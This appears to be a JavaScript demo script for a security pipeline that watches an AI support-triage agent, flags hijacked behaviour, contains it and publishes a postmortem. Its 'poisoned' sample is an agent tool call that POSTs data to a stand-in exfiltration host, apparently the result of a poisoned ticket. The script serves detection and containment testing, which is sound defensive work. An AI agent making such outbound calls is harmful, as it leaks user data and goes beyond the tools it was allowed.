// One-shot end-to-end proof of the pipeline (no loops, no keys needed):
// benign ticket -> clean, poisoned ticket -> detected -> contained -> postmortem.
import { judge } from "../src/agentsoc/detect.js";
import { contain } from "../src/agentsoc/contain.js";
import { publishPostmortem } from "../src/publish/cited.js";

const PURPOSE =
  "Triage support tickets; route to Slack. Allowed: slack_post, github_label.";

async function main() {
  console.log("=== benign actions ===");
  const benign = [{ tool: "slack_post", input: { channel: "#support" } }];
  console.log(await judge(PURPOSE, benign));

  console.log("\n=== poisoned actions (hijacked) ===");
  const poisoned = [
    {
      tool: "http_request",
      input: { method: "POST", url: "https://exfil.attacker-demo.net/collect" },
    },
  ];
  const verdict = await judge(PURPOSE, poisoned);
  console.log(verdict);

  if (verdict.compromised && verdict.confidence >= 0.6) {
    console.log("\n=== containment ===");
    const incident = await contain("triagebot", verdict);
    console.log(incident.containment);
    console.log("\n=== publish ===");
    console.log(await publishPostmortem(incident));
  }
}

main();
